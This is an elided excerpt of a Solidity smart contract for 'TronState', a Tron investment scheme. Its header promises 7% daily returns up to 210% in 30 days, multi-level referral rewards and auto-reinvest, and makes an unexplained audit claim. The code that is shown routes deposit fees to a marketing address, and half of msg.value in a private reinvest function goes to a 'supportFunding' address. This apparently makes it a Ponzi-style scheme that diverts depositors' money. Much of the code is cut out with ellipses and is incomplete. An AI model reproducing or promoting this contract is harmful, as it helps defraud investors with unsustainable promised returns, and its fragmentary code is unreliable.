//SourceUnit: TronState.sol

/**TRONSTATE
 (Audited by CodeCompass)
 - Earn 7% DAILY - Until 210% (30days)
 - Join telegram group - t.me/TronStateGroup
 - 15% Referal Rewards - 3 Levels (8,3,2)
 - 20% Auto Reinvest
...
contract TronState is Ownable {
    ...
    uint256 private withdraw_limit = 80000000000000;
    ...
    function deposit(address _referral) external payable {
        ...
        marketing.transfer(msg.value.mul(1).div(100));
    ...
    function withdraw() payable external {
     ...
     function reinvest(address _addrs,uint256 _amount)private{
        ...
        supportFunding.transfer(msg.value.mul(50).div(100));
